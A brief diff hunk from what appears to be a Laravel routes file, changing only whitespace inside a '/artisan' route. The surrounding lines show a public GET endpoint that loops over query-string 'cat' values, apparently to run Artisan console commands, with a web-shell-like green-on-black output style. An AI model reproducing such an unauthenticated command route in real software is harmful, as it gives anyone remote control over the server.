@@ -47,7 +47,7 @@ route::get('/up',function () {
  });
 
  Route::get('/artisan', function (Request $request) {
-     
+
                 $hm ='<style> body{background-color:black;} h4{color: #4de04d;} </style>';
             //?cat[]=view:clear&cat[]=config:clear
                 foreach( $request->get('cat') as $art){
